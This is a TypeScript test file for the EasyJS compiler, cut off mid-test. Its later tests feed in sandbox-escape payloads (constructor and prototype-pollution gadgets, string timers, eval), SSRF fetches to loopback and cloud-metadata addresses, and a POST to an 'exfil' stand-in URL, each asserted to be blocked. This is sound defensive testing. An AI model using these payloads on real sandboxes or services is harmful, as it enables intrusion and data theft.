import {
  buildBrowserSandboxDocument,
  buildLexicallyIsolatedInvocation,
  CapabilitySecurityManager,
  compileEasyJS,
  formatEasyJS,
  runEasyJSAsync,
  SandboxBuilderEngine,
  SecurityAnalyzer,
  SecurityPolicyManager,
} from '../src/compiler/index.ts';
import type { TestCaseResult } from './lexer.test.ts';

function assertTrue(cond: boolean, message: string): void {
  if (!cond) throw new Error(message);
}

export async function runGeneratorTests(): Promise<TestCaseResult[]> {
  const tests: Array<{ name: string; fn: () => Promise<void> | void }> = [
    {
      name: 'Compiles and executes OOP class hierarchy with f-strings',
      fn: async () => {
        const src = `
          trait Describable {
            fn describe() -> str
          }
          class Entity {
            pub id: int
            init(id: int) {
              self.id = id
            }
          }
          class Task extends Entity implements Describable {
            pub title: str
            init(id: int, title: str) {
              super(id)
              self.title = title
            }
            pub fn describe() -> str {
              return f"Task #{self.id}: {self.title}"
            }
          }
          let t = new Task(7, "Ship Lexer")
          print(t.describe())
        `;
        const out = await runEasyJSAsync(src, { ephemeral: true });
        assertTrue(out.success, 'Expected successful compilation');
        assertTrue(!out.execution?.error, `Unexpected runtime error: ${out.execution?.error}`);
        assertTrue(out.execution?.logs[0] === 'Task #7: Ship Lexer', 'Expected matching log output');
      },
    },
    {
      name: 'Compiles and executes algebraic enums with pattern matching',
      fn: async () => {
        const src = `
          enum Shape {
            Circle(radius),
            Rect(w, h)
          }
          fn area(s) -> float {
            return match s {
              Shape.Circle(r) => 3 * r * r,
              Shape.Rect(w, h) => w * h,
              _ => 0
            }
          }
          print(area(Shape.Rect(4, 5)))
        `;
        const out = await runEasyJSAsync(src, { ephemeral: true });
        assertTrue(out.success, 'Expected compilation success');
        assertTrue(out.execution?.logs[0] === '20', `Expected '20', got ${out.execution?.logs[0]}`);
      },
    },
    {
      name: 'Executes smart pointers, borrow, shared refCount, and defer',
      fn: async () => {
        const src = `
          fn demo() {
            defer print("deferred cleanup")
            own data = 100
            ref view = &data
            *data = 250
            print(*view)
            shared s1 = share("buffer")
            let s2 = s1.clone()
            print(refCount(s2))
            drop s1
            print(refCount(s2))
          }
          demo()
        `;
        const out = await runEasyJSAsync(src, { ephemeral: true });
        assertTrue(out.success, 'Expected compilation success');
        assertTrue(!out.execution?.error, `Unexpected error: ${out.execution?.error}`);
        assertTrue(out.execution?.logs[0] === '250', 'Expected deref 250');
        assertTrue(out.execution?.logs[1] === '2', 'Expected refCount 2');
        assertTrue(out.execution?.logs[2] === '1', 'Expected refCount 1 after drop');
        assertTrue(out.execution?.logs[3] === 'deferred cleanup', 'Expected LIFO defer execution');
      },
    },
    {
      name: 'Executes range loops and functional pipelines',
      fn: async () => {
        const src = `
          let total = 1..=5 |> filter(fn(n) => n % 2 == 1) |> map(fn(n) => n * 10) |> sum()
          print(total)
        `;
        const out = await runEasyJSAsync(src, { ephemeral: true });
        assertTrue(out.success, 'Expected compilation success');
        assertTrue(out.execution?.logs[0] === '90', `Expected '90', got ${out.execution?.logs[0]}`);
      },
    },
    {
      name: 'Executes array, dictionary, Stack, Queue, text, and math operations',
      fn: async () => {
        const src = `
          var nums = [20, 3, 10, 3]
          nums.append(5)
          nums.remove(3)
          nums.sort()
          print(join(nums, ","))
          print(nums.find(fn(n) => n > 10))

          dict user = { name: "Alex" }
          user.set("score", 42)
          print(user.get("score"), "name" in user, "zip" not in user)
          user.remove("score")
          print(len(user.keys()))

          stack st = Stack([1, 2])
          st.push(3)
          print(st.pop(), st.peek())

          text raw = "  easyjs  "
          print(raw.trim().upper())
          print((-15).abs(), toInt("7") + 3)
        `;
        const out = await runEasyJSAsync(src, { ephemeral: true });
        assertTrue(out.success, 'Expected compilation success');
        assertTrue(!out.execution?.error, `Unexpected error: ${out.execution?.error}`);
        assertTrue(out.execution?.logs[0] === '3,5,10,20', `Sorted array mismatch: ${out.execution?.logs[0]}`);
        assertTrue(out.execution?.logs[1] === '20', `Find mismatch: ${out.execution?.logs[1]}`);
        assertTrue(out.execution?.logs[2] === '42 true true', `Dict mismatch: ${out.execution?.logs[2]}`);
        assertTrue(out.execution?.logs[3] === '1', `Dict keys len mismatch: ${out.execution?.logs[3]}`);
        assertTrue(out.execution?.logs[4] === '3 2', `Stack mismatch: ${out.execution?.logs[4]}`);
        assertTrue(out.execution?.logs[5] === 'EASYJS', `String mismatch: ${out.execution?.logs[5]}`);
        assertTrue(out.execution?.logs[6] === '15 10', `Math/toInt mismatch: ${out.execution?.logs[6]}`);
      },
    },
    {
      name: 'Executes interactive input(), inputInt(), and C-style for loops with stdin',
      fn: async () => {
        const src = `
          text name = input("Name: ")
          int n = inputInt("Count: ")
          var sum = 0
          for (let i = 1; i <= n; i++) {
            sum += i
          }
          let band = match sum {
            10..=20 => "mid",
            _ => "other"
          }
          print(f"{name}:{sum}:{band}")
        `;
        const out = await runEasyJSAsync(src, { stdin: ['Sam', '5'], ephemeral: true });
        assertTrue(out.success, 'Expected compilation success');
        assertTrue(!out.execution?.error, `Unexpected error: ${out.execution?.error}`);
        assertTrue(out.execution?.logs[0] === 'Sam:15:mid', `Expected 'Sam:15:mid', got ${out.execution?.logs[0]}`);
      },
    },
    {
      name: 'Executes standard library (Core, System, Stack) and scope isolation',
      fn: async () => {
        const src = `
          textVal = uppercase("hello")
          print(textVal, lowercase(textVal), length(textVal))
          print(replace("Hi!", "Hi", "Hello"), join(split("a,b", ","), "-"))
          print(reverse("abc"), contains("hello", "ell"))

          items = [5, 2, 8, 1, 2]
          push(items, 9)
          popped = pop(items)
          sort(items)
          print(popped, join(unique(items), ","), first(items), last(items), find(items, 8))
          print(join(filter(items, fn(n) => n >= 5), ","))
          print(sqrt(25), random(1, 1) == 1)

          arr = stack.array(1, 2, 3)
          d = stack.dict(["a", "b"], [10, 20])
          print(length(arr), d.get("b"))

          writeFile("demo.txt", "EasyJS VFS")
          print(readFile("demo.txt"), deleteFile("demo.txt"))

          scope isolated {
            x = 99
            print(x)
          }
          x = 12
          print(x)
          exit()
          print("should not print")
        `;
        const out = await runEasyJSAsync(src, { ephemeral: true });
        assertTrue(out.success, `Expected compilation success: ${JSON.stringify(out.diagnostics)}`);
        assertTrue(!out.execution?.error, `Unexpected error: ${out.execution?.error}`);
        assertTrue(out.execution?.haltedByExit === true, 'Expected clean exit() halt');
        assertTrue(out.execution?.logs[0] === 'HELLO hello 5', `String ops mismatch: ${out.execution?.logs[0]}`);
        assertTrue(out.execution?.logs[1] === 'Hello! a-b', `Replace/join mismatch: ${out.execution?.logs[1]}`);
        assertTrue(out.execution?.logs[2] === 'cba true', `Reverse/contains mismatch: ${out.execution?.logs[2]}`);
        assertTrue(out.execution?.logs[3] === '9 1,2,5,8 1 8 8', `Collection ops mismatch: ${out.execution?.logs[3]}`);
        assertTrue(out.execution?.logs[4] === '5,8', `Filter mismatch: ${out.execution?.logs[4]}`);
        assertTrue(out.execution?.logs[5] === '5 true', `Math ops mismatch: ${out.execution?.logs[5]}`);
        assertTrue(out.execution?.logs[6] === '3 20', `Stack lib mismatch: ${out.execution?.logs[6]}`);
        assertTrue(out.execution?.logs[7] === 'EasyJS VFS true', `VFS mismatch: ${out.execution?.logs[7]}`);
        assertTrue(out.execution?.logs[8] === '99', `Scope inner mismatch: ${out.execution?.logs[8]}`);
        assertTrue(out.execution?.logs[9] === '12', `Scope outer mismatch: ${out.execution?.logs[9]}`);
        assertTrue(out.execution?.logs.length === 10, 'Expected exit() to stop before final print');
      },
    },
    {
      name: 'Executes extreme nested if/elif/else chains (12+ levels, mixed colon/braces, inline colons, and constant-if scoping)',
      fn: async () => {
        const src = `
fn classify(a, b, c, d, e, f, g, h):
  result = "start"
  if a > 0:
    if b > 0:
      if c > 0:
        if d > 0:
          if e > 0:
            if f > 0:
              if g > 0:
                if h == 1:
                  result = "depth8-h1"
                elif h == 2:
                  result = "depth8-h2"
                elif h == 3: print("inline")
                else:
                  result = "depth8-other"
              elif g == 0 {
                if h > 10:
                  result = "mixed-brace-colon-gt10"
                else:
                  result = "mixed-brace-colon-le10"
              }
              else:
                result = "g-neg"
            elif f == -1:
              result = "f-minus1"
            else:
              result = "f-neg"
          else:
            result = "e-nonpos"
        elif d == 0:
          result = "d-zero"
        else:
          result = "d-neg"
      else:
        result = "c-nonpos"
    elif b == 0:
      result = "b-zero"
    else:
      result = "b-neg"
  elif a == 0:
    result = "a-zero"
  else:
    result = "a-neg"
  return result

# Verify constant-if block scoping with lexical collision safety
if true {
  let x = 100
  print(x)
}
let x = 200
print(x)

print(classify(1, 1, 1, 1, 1, 1, 1, 2))
print(classify(1, 1, 1, 1, 1, 1, 0, 15))
print(classify(1, 1, 1, 1, 1, -1, 1, 1))
print(classify(1, 0, 1, 1, 1, 1, 1, 1))
print(classify(0, 1, 1, 1, 1, 1, 1, 1))
`;
        const out = await runEasyJSAsync(src, { ephemeral: true });
        assertTrue(out.success, `Expected compile success: ${JSON.stringify(out.diagnostics)}`);
        assertTrue(!out.execution?.error, `Unexpected runtime error: ${out.execution?.error}`);
        assertTrue(out.execution?.logs[0] === '100', `Expected 100, got ${out.execution?.logs[0]}`);
        assertTrue(out.execution?.logs[1] === '200', `Expected 200, got ${out.execution?.logs[1]}`);
        assertTrue(out.execution?.logs[2] === 'depth8-h2', `Expected depth8-h2, got ${out.execution?.logs[2]}`);
        assertTrue(out.execution?.logs[3] === 'mixed-brace-colon-gt10', `Expected mixed-brace-colon-gt10, got ${out.execution?.logs[3]}`);
        assertTrue(out.execution?.logs[4] === 'f-minus1', `Expected f-minus1, got ${out.execution?.logs[4]}`);
        assertTrue(out.execution?.logs[5] === 'b-zero', `Expected b-zero, got ${out.execution?.logs[5]}`);
        assertTrue(out.execution?.logs[6] === 'a-zero', `Expected a-zero, got ${out.execution?.logs[6]}`);
      },
    },
    {
      name: 'Executes multi-level constructors (init/constructor/super), default params, direct calls without new, and colon classes',
      fn: async () => {
        const src = `
class Base:
  pub baseVal: int
  constructor(v: int = 10):
    if v < 0:
      self.baseVal = 0
    else:
      self.baseVal = v

class Mid extends Base {
  pub tag: str = "mid"
}

class Leaf extends Mid {
  pub childVal: int
  init(baseV: int, mult: int = 2) {
    super(baseV)
    if mult > 5:
      self.childVal = self.baseVal * mult
    elif mult > 0:
      self.childVal = self.baseVal + mult
    else:
      return
      self.childVal = -1
  }
  pub fn summary() -> str => f"{self.tag}:{self.baseVal}:{self.childVal}"
}

a = new Leaf(15, 6)
b = Leaf(-5, 3)
c = Base()
print(a.summary())
print(b.summary())
print(c.baseVal)
`;
        const out = await runEasyJSAsync(src, { ephemeral: true });
        assertTrue(out.success, `Expected compile success: ${JSON.stringify(out.diagnostics)}`);
        assertTrue(!out.execution?.error, `Unexpected error: ${out.execution?.error}`);
        assertTrue(out.execution?.logs[0] === 'mid:15:90', `Expected mid:15:90, got ${out.execution?.logs[0]}`);
        assertTrue(out.execution?.logs[1] === 'mid:0:3', `Expected mid:0:3, got ${out.execution?.logs[1]}`);
        assertTrue(out.execution?.logs[2] === '10', `Expected 10, got ${out.execution?.logs[2]}`);
      },
    },
    {
      name: 'Performs AST optimization, minification, source maps, and formatting',
      fn: async () => {
        const src = `
fn unusedHelper() {
  return 999
}
let folded = 2 + 3 * 4
if false {
  print("dead branch")
}
print(folded)
`;
        const compiled = compileEasyJS(src, { minify: true });
        assertTrue(compiled.success, 'Expected success');
        assertTrue(compiled.optimization.foldedConstants >= 1, 'Expected constant folding');
        assertTrue(compiled.optimization.eliminatedBranches >= 1, 'Expected dead branch elimination');
        assertTrue(compiled.optimization.shakenFunctions.includes('unusedHelper'), 'Expected tree shaking');
        assertTrue(compiled.sourceMap.length > 0, 'Expected source map entries');
        assertTrue(!compiled.code.includes('unusedHelper'), 'Unused function should be shaken');

        const formatted = formatEasyJS('if x>0:\n    print("ok")\nelse:\n    print("no")');
        assertTrue(formatted.includes('  print("ok")'), `Expected formatted indent, got:\n${formatted}`);
      },
    },
    {
      name: 'Executes all arrow functions, colon/brace arrow blocks, -> return annotations, match =>, and |> pipelines',
      fn: async () => {
        const src = `
double = x => x * 2
addBlock = (a: int, b: int) => {
  total = a + b
  return total * 10
}
blockFn = fn(n) => {
  return n + 5
}
colonArrow = (label) =>:
  up = uppercase(label)
  return "tag:{up}"
fn sq(x: int) -> int => x * x

piped = 1..=6
  |> filter(n => n % 2 == 0)
  |> map(n => n * 3)
  |> sum()

ranked = match 88 {
  90..=100 => "A",
  75..90 => "B",
  _ => "C"
}

print(double(6), addBlock(2, 3), blockFn(4), colonArrow("ok"), sq(7), piped, ranked)
`;
        const out = await runEasyJSAsync(src, { ephemeral: true });
        assertTrue(out.success, `Expected compile success: ${JSON.stringify(out.diagnostics)}`);
        assertTrue(!out.execution?.error, `Unexpected error: ${out.execution?.error}`);
        assertTrue(
          out.execution?.logs[0] === '12 50 9 tag:OK 49 36 B',
          `Arrow output mismatch: ${out.execution?.logs[0]}`
        );
      },
    },
    {
      name: 'Compiles and runs stdlib/yourgui with style {} block, elements, input() disambiguation, and arrow events',
      fn: async () => {
        const src = `
import yourgui from "stdlib/yourgui"
style {
  body { background: #111; color: white; }
  button { background: #2563eb; padding: 12px; }
}
heading("Welcome")
nameInput = input("Enter your name")
agree = checkbox("Subscribe", true)
role = select(["Dev", "Design"])
btn = button("Click Me")
onClick(btn, () => {
  text("Hello {nameInput.value}")
})
print(agree.checked, role.value)
`;
        const out = await runEasyJSAsync(src, { ephemeral: true });
        assertTrue(out.success, `Expected compile success: ${JSON.stringify(out.diagnostics)}`);
        assertTrue(!out.execution?.error, `Unexpected error: ${out.execution?.error}`);
        assertTrue(out.execution?.logs[0] === 'true Dev', `Expected checkbox/select state, got ${out.execution?.logs[0]}`);
        const gui = out.execution?.visualOutputs?.find((v) => v.kind === 'yourgui');
        assertTrue(Boolean(gui), 'Expected yourgui visual snapshot');
        if (gui && gui.kind === 'yourgui') {
          assertTrue(gui.styles[0].includes('#111'), 'Expected CSS style preserved');
          assertTrue(gui.nodes.length >= 5, `Expected mounted GUI nodes, got ${gui.nodes.length}`);
        }
      },
    },
    {
      name: 'Executes stdlib/server routes returning object literals from arrow functions',
      fn: async () => {
        const src = `
server.get("/ping", req => ({ ok: true, method: req.method }))
server.post("/echo", req => ({ got: req.body }))
server.start(3000)
r1 = server.request("GET", "/ping")
r2 = server.request("POST", "/echo", { name: "Ada" })
r404 = server.request("GET", "/missing")
print(r1.status, r1.body.ok, r2.body.got.name, r404.status)
`;
        const out = await runEasyJSAsync(src, { ephemeral: true });
        assertTrue(out.success, `Expected compile success: ${JSON.stringify(out.diagnostics)}`);
        assertTrue(!out.execution?.error, `Unexpected error: ${out.execution?.error}`);
        assertTrue(
          Boolean(out.execution?.logs.some((l) => l === '200 true Ada 404')),
          `Expected '200 true Ada 404', got ${JSON.stringify(out.execution?.logs)}`
        );
      },
    },
    {
      name: 'Executes C++ comma for-loops, while, do...while, and OOP constructors (fn init, ClassName, implicit super)',
      fn: async () => {
        const src = `
class Base {
  pub x: int
  Base(v: int = 5) {
    self.x = v
  }
}
class Derived extends Base {
  pub y: int = 2
  fn init(y: int) {
    self.y = y
  }
  pub fn sum() => self.x + self.y
}
d = Derived(7)
total = 0
for (i = 1, i <= 4, i++):
  total += i
k = 0
do {
  k += 1
} while (k < 3)
print(d.sum(), total, k)
`;
        const out = await runEasyJSAsync(src, { ephemeral: true });
        assertTrue(out.success, `Expected compile success: ${JSON.stringify(out.diagnostics)}`);
        assertTrue(!out.execution?.error, `Unexpected runtime error: ${out.execution?.error}`);
        assertTrue(out.execution?.logs[0] === '12 10 3', `Expected '12 10 3', got ${out.execution?.logs[0]}`);
      },
    },
    {
      name: 'Executes YourGUI section DOM manipulation and button built-in methods (.innertext, .push, .pop, .disable, .click)',
      fn: async () => {
        const src = `
import yourgui from "stdlib/yourgui"
section("main", () => {
  lbl = text("Init")
  lbl.id = "status"
  btn = button("#action", "Go")
  btn.push("A")
  btn.push("B")
  popped = btn.pop()
  btn.onclick = () => {
    dom("status").innertext = "Clicked:{btn.peek()}:{btn.count()}"
    btn.disable()
    btn.setColor("#ffffff")
  }
  btn.click()
  print(popped, dom("status").innertext, btn.disabled)
})
`;
        const out = await runEasyJSAsync(src, { ephemeral: true });
        assertTrue(out.success, `Expected compile success: ${JSON.stringify(out.diagnostics)}`);
        assertTrue(!out.execution?.error, `Unexpected runtime error: ${out.execution?.error}`);
        assertTrue(
          out.execution?.logs[0] === 'B Clicked:A:1 true',
          `Expected 'B Clicked:A:1 true', got ${out.execution?.logs[0]}`
        );
      },
    },
    {
      name: 'Executes C++ pointers (int*, int**, &), swap(int&, int&), new[]/delete[], unique_ptr/shared_ptr/weak_ptr, sizeof, and const pointee safety',
      fn: async () => {
        const src = `
x = 10
y = 20
int* p = &x
int** pp = &p
*p = 55
fn swap(int& a, int& b):
  t = a
  a = b
  b = t
swap(x, y)
int* arr = new int[3]
arr[0] = 7
arr[1] = 8
arr[2] = 9
s = *(arr + 1)
delete[] arr
u1 = make_unique({ val: 42 })
u2 = std::move(u1)
sh = make_shared(100)
wk = weak_ptr(sh)
locked = wk.lock()
print(x, y, **pp, s, sizeof(int), u2->val, *locked, wk.expired())
`;
        const out = await runEasyJSAsync(src, { ephemeral: true });
        assertTrue(out.success, `Expected compile success: ${JSON.stringify(out.diagnostics)}`);
        assertTrue(!out.execution?.error, `Unexpected runtime error: ${out.execution?.error}`);
        assertTrue(
          out.execution?.logs[0] === '20 55 20 8 4 42 100 false',
          `Pointer output mismatch: ${out.execution?.logs[0]}`
        );

        const constErr = compileEasyJS(`x = 5\nconst int* cp = &x\n*cp = 9`);
        assertTrue(!constErr.success, 'Expected compile error writing through const int*');
      },
    },
    {
      name: 'SecurityAnalyzer analyzes imports, style blocks, classes, loops, and branches without false errors',
      fn: async () => {
        const src = `
import yourgui from "stdlib/yourgui"
style { body { color: #f8fafc; } }
class Item {
  pub count: int
  init(count: int) { self.count = count }
  pub fn inc() -> int { return self.count + 1 }
}
fn runAll(limit: int):
  for (i = 0, i < limit, i++):
    if i == 1:
      print("one")
    else:
      print(i)
obj = new Item(2)
print(obj.inc())
runAll(2)
`;
        const out = await runEasyJSAsync(src, { ephemeral: true });
        assertTrue(out.success, `Expected compile success: ${JSON.stringify(out.diagnostics)}`);
        assertTrue(out.security?.analysisComplete === true, 'Expected complete security analysis');
        assertTrue(!out.execution?.error, `Unexpected runtime error: ${out.execution?.error}`);
        assertTrue(
          out.execution?.logs.join('|') === '3|0|one',
          `Expected '3|0|one', got ${out.execution?.logs.join('|')}`
        );
      },
    },
    {
      name: 'SecurityAnalyzer catches ownership violations and sandbox isolates host globals and eval',
      fn: async () => {
        const dropBorrowed = compileEasyJS(`own a = 1\nref r = &a\ndrop a`);
        assertTrue(!dropBorrowed.success, 'Expected drop-while-borrowed to fail compilation');

        const useMoved = compileEasyJS(`own a = 1\nown b = move a\nprint(*a)`);
        assertTrue(!useMoved.success, 'Expected use-after-move to fail compilation');

        // Compile-time CapabilitySecurityManager blocks host escape globals & eval by default
        const blockedCompile = compileEasyJS(`print(window, document, eval("1+1"))`);
        assertTrue(!blockedCompile.success, 'Expected compile-time capability block for host globals & eval');

        // Runtime sandbox layer independently blocks host globals and eval even if static check is relaxed
        const relaxedGlobals = {
          ephemeral: true,
          securityPolicy: {
            globals: { forbidHostEscapeGlobals: false, forbidDynamicEval: false },
          },
        };
        const sbGlobals = await runEasyJSAsync(
          `print(window == undefined, document == undefined, process == undefined, require == undefined)`,
          relaxedGlobals
        );
        assertTrue(sbGlobals.success && !sbGlobals.execution?.error, 'Expected sandbox global check to run');
        assertTrue(
          sbGlobals.execution?.logs[0] === 'true true true true',
          `Expected host globals to be blocked, got ${sbGlobals.execution?.logs[0]}`
        );

        const sbEval = await runEasyJSAsync(
          `try {\n  eval("1 + 1")\n} catch e {\n  print(e.message)\n}`,
          relaxedGlobals
        );
        assertTrue(sbEval.success && !sbEval.execution?.error, 'Expected sandbox eval catch to run');
        assertTrue(
          Boolean(sbEval.execution?.logs[0]?.includes('SecurityError')),
          `Expected SecurityError from eval(), got ${sbEval.execution?.logs[0]}`
        );
      },
    },
    {
      name: 'NetworkPolicyManager bounds fetch() against cookies, credentials, SSRF, and unsafe methods',
      fn: async () => {
        const cookieCreds = compileEasyJS(`fetch("https://example.com/api", { credentials: "include" })`);
        assertTrue(!cookieCreds.success, 'Expected fetch credentials: include to be blocked');

        const cookieHeader = compileEasyJS(`fetch("https://example.com/api", { headers: { Cookie: "sid=123" } })`);
        assertTrue(!cookieHeader.success, 'Expected Cookie header in fetch to be blocked');

        const ssrfLocal = compileEasyJS(`fetch("http://127.0.0.1:8080/secret")`);
        assertTrue(!ssrfLocal.success, 'Expected loopback SSRF fetch to be blocked');

        const ssrfMeta = compileEasyJS(`fetch("http://169.254.169.254/latest/meta-data/")`);
        assertTrue(!ssrfMeta.success, 'Expected cloud metadata SSRF fetch to be blocked');

        const unsafePost = compileEasyJS(`fetch("https://example.com/exfil", { method: "POST", body: "x" })`);
        assertTrue(!unsafePost.success, 'Expected POST fetch to be blocked under default read-only policy');

        const safeGet = compileEasyJS(`fn load() {\n  return fetch("https://api.example.com/info")\n}`);
        assertTrue(safeGet.success, `Expected safe public GET fetch to compile: ${JSON.stringify(safeGet.diagnostics)}`);
      },
    },
    {
      name: 'GlobalAccessPolicy controls globalThis (disabled by default, readonly/sandboxed via policy)',
      fn: async () => {
        const disabledCompile = compileEasyJS(`print(globalThis)`);
        assertTrue(!disabledCompile.success, 'Expected globalThis to be blocked when globalThisMode is disabled');

        const disabledRuntime = await runEasyJSAsync(
          `try {\n  x = globalThis.Math\n  print("leaked")\n} catch e {\n  print(e.message)\n}`,
          { ephemeral: true, securityPolicy: { globals: { globalThisMode: 'sandboxed' } } }
        );
        assertTrue(disabledRuntime.success, 'Sandboxed globalThisMode allows safe globalThis');

        const readonlyMutate = compileEasyJS(`globalThis.hack = 1`, {
          securityPolicy: { globals: { globalThisMode: 'readonly' } },
        });
        assertTrue(!readonlyMutate.success, 'Expected mutating globalThis to fail in readonly mode');

        const readonlyRead = compileEasyJS(`print(globalThis.Math)`, {
          securityPolicy: { globals: { globalThisMode: 'readonly' } },
        });
        assertTrue(readonlyRead.success, 'Expected reading globalThis to pass in readonly mode');
      },
    },
    {
      name: 'BorrowChecker prevents dangling references, immutable-borrow writes, and mutable aliasing',
      fn: async () => {
        const danglingRet = compileEasyJS(`fn leak() {\n  own x = 42\n  return &x\n}`);
        assertTrue(!danglingRet.success, 'Expected returning &local owner to fail borrow lifetime check');

        const writeThroughShared = compileEasyJS(`own x = 10\nref r = &x\n*r = 20`);
        assertTrue(!writeThroughShared.success, 'Expected mutating through shared ref to be rejected');

        const mutAlias = compileEasyJS(`own x = 10\nref r = &x\nint& m = x`);
        assertTrue(!mutAlias.success, 'Expected mutable borrow while shared borrow exists to be rejected');
      },
    },
    {
      name: 'TypeChecker validates recursive functions, arity/arg types, control-flow returns, structs, and null safety',
      fn: async () => {
        const recursiveOk = await runEasyJSAsync(`
fn fib(n: int) -> int {
  if n <= 1:
    return n
  else:
    return fib(n - 1) + fib(n - 2)
}
print(fib(6))
`, { ephemeral: true });
        assertTrue(recursiveOk.success, `Expected recursive function to compile: ${JSON.stringify(recursiveOk.diagnostics)}`);
        assertTrue(recursiveOk.execution?.logs[0] === '8', `Expected fib(6)=8, got ${recursiveOk.execution?.logs[0]}`);

        const badArity = compileEasyJS(`fn add(a: int, b: int) -> int { return a + b }\nprint(add(1))`);
        assertTrue(!badArity.success, 'Expected wrong argument count to fail type check');

        const badArgType = compileEasyJS(`fn greet(name: str) -> str { return name }\nprint(greet(123))`);
        assertTrue(!badArgType.success, 'Expected wrong argument type to fail type check');

        const missingReturnPath = compileEasyJS(`fn check(ok: bool) -> int {\n  if ok:\n    return 1\n}`);
        assertTrue(!missingReturnPath.success, 'Expected missing return branch to fail control-flow check');

        const nullUnsafe = compileEasyJS(`var s: str? = null\nvar strict: str = s`);
        assertTrue(!nullUnsafe.success, 'Expected assigning nullable str? to non-null str to fail');

        const nullNarrowedOk = compileEasyJS(`
fn unwrap(s: str?) -> str {
  if s != null {
    var safe: str = s
    return safe
  }
  return "default"
}
`);
        assertTrue(nullNarrowedOk.success, `Expected narrowed nullable type to pass: ${JSON.stringify(nullNarrowedOk.diagnostics)}`);
      },
    },
    {
      name: 'SecurityAnalyzer and CapabilitySecurityManager fail closed on incomplete analysis or unknown AST nodes',
      fn: async () => {
        const analyzer = new SecurityAnalyzer();
        const forgedAst = {
          kind: 'Program' as const,
          line: 1,
          column: 1,
          body: [
            {
              kind: 'UnknownMaliciousStatement' as never,
              line: 1,
              column: 1,
            } as never,
          ],
        };
        const res = analyzer.analyze(forgedAst);
        assertTrue(!res.analysisComplete, 'Expected analysisComplete to become false on unknown AST statement');
        assertTrue(!res.success, 'Expected SecurityAnalyzer to fail closed on unknown AST statement');
        assertTrue(
          res.diagnostics.some((d) => d.code === 'SEC000'),
          'Expected SEC000 diagnostic when security analysis is incomplete'
        );

        const capMgr = new CapabilitySecurityManager();
        const capRes = capMgr.analyze(forgedAst);
        assertTrue(!capRes.analysisComplete, 'Expected CapabilitySecurityManager analysisComplete=false on unknown AST node');
        assertTrue(!capRes.success, 'Expected CapabilitySecurityManager to reject unknown AST node');

        // Deeply nested AST (>200 levels) must fail closed rather than silently skipping checks
        let deepExpr: Record<string, unknown> = { kind: 'Literal', value: 1, raw: '1', literalType: 'number', line: 1, column: 1 };
        for (let i = 0; i < 230; i++) {
          deepExpr = {
            kind: 'UnaryExpression',
            operator: '-',
            operand: deepExpr,
            line: 1,
            column: 1,
          };
        }
        const deepAst = {
          kind: 'Program' as const,
          line: 1,
          column: 1,
          body: [{ kind: 'ExpressionStatement', expression: deepExpr, line: 1, column: 1 } as never],
        };
        const deepRes = new SecurityAnalyzer().analyze(deepAst);
        assertTrue(!deepRes.analysisComplete, 'Expected SecurityAnalyzer to fail closed when depth budget is exceeded');
        assertTrue(!deepRes.success, 'Expected SecurityAnalyzer to block oversized AST depth');
      },
    },
    {
      name: 'CapabilitySecurityManager blocks meta-programming escapes, timer string-eval, and computed constructor gadgets',
      fn: async () => {
        const attacks = [
          `p = new Proxy({}, {})`,
          `r = Reflect.get({}, "a")`,
          `w = WebAssembly`,
          `Object.defineProperty({}, "x", { value: 1 })`,
          `Object.setPrototypeOf({}, {})`,
          `setTimeout("process.exit(1)", 0)`,
          `k = "constructor"\nx = ({})[k]`,
          `x = ({})["con" + "structor"]`,
          `print(__ejs_Proxy)`,
          `var bad: int = "str"\nprint(eval("1+1"))`,
        ];

        for (const attack of attacks) {
          const compiled = compileEasyJS(attack);
          assertTrue(!compiled.success, `Expected attack to be blocked at compile time: ${attack}`);
          assertTrue(compiled.code === '', `Expected zero emitted JS code for blocked attack: ${attack}`);
          assertTrue(
            compiled.securityVerdict.approved === false,
            `Expected securityVerdict.approved=false for attack: ${attack}`
          );
        }

        // Security errors must never be masked even when TypeChecker also finds an error
        const mixed = compileEasyJS(`var bad: int = "str"\nprint(eval("1+1"))`);
        assertTrue(
          mixed.diagnostics.some((d) => Boolean(d.title?.startsWith('Security '))),
          'Expected Security diagnostic to still be reported alongside type errors'
        );
      },
    },
    {
      name: 'VM sandbox blocks cross-realm constructor escapes, prototype pollution, and string timers at runtime',
      fn: async () => {
        const relaxedStatic = {
          ephemeral: true,
          securityPolicy: {
            globals: {
              forbidHostEscapeGlobals: false,
              forbidDynamicEval: false,
              forbidPrototypeAccess: false,
            },
          },
        };

        const ctorEscape = await runEasyJSAsync(
          `try {\n  fnLeak = print["constructor"]("return process")()\n  print("ESCAPED", fnLeak)\n} catch e {\n  print("BLOCKED:" + e.message)\n}`,
          relaxedStatic
        );
        assertTrue(
          Boolean(ctorEscape.execution?.logs[0]?.startsWith('BLOCKED:')),
          `Expected print["constructor"] escape to be blocked, got ${JSON.stringify(ctorEscape.execution)}`
        );

        const protoPollute = await runEasyJSAsync(
          `try {\n  ({}).__proto__.pwned = 123\n  print("POLLUTED:" + ({}).pwned)\n} catch e {\n  print("PROTO_BLOCKED:" + e.message)\n}`,
          relaxedStatic
        );
        const protoOut = protoPollute.execution?.logs[0] ?? '';
        assertTrue(
          protoOut.startsWith('PROTO_BLOCKED:') || protoOut === 'POLLUTED:undefined' || Boolean(protoPollute.execution?.error),
          `Expected prototype pollution to fail inside VM sandbox, got ${JSON.stringify(protoPollute.execution)}`
        );

        const stringTimer = await runEasyJSAsync(
          `try {\n  setTimeout("console.log(1)", 0)\n  print("ALLOWED")\n} catch e {\n  print("TIMER_BLOCKED:" + e.message)\n}`,
          relaxedStatic
        );
        assertTrue(
          Boolean(stringTimer.execution?.logs[0]?.startsWith('TIMER_BLOCKED:')),
          `Expected setTimeout string evaluation to be blocked, got ${JSON.stringify(stringTimer.execution)}`
        );
      },
    },
    {
      name: 'SandboxBuilderEngine builds CSP-hardened lexical isolation without new Function() or with()',
      fn: () => {
        const compiled = compileEasyJS(`print("</script><!-- safe -->")`);
        assertTrue(compiled.success, 'Expected script-tag escape test snippet to compile');

        const lexicalUnit = buildLexicallyIsolatedInvocation({
          code: compiled.code,
          globalThisMode: 'disabled',
          asyncExecution: true,
        });
        assertTrue(!lexicalUnit.includes('new Function'), 'Must not contain new Function()');
        assertTrue(!lexicalUnit.includes('with ('), 'Must not use with(...) proxy scopes');
        assertTrue(lexicalUnit.includes('window, document'), 'Must lexically shadow host globals');

        const policy = new SecurityPolicyManager().policy;
        const html = buildBrowserSandboxDocument({
          code: compiled.code,
          token: 'test_tok',
          policy,
          stdin: ['</script>'],
        });
        assertTrue(!html.includes("'unsafe-eval'"), 'CSP must omit unsafe-eval');
        assertTrue(
          html.includes("script-src 'unsafe-inline'"),
          'CSP must permit pre-built inline script execution only'
        );
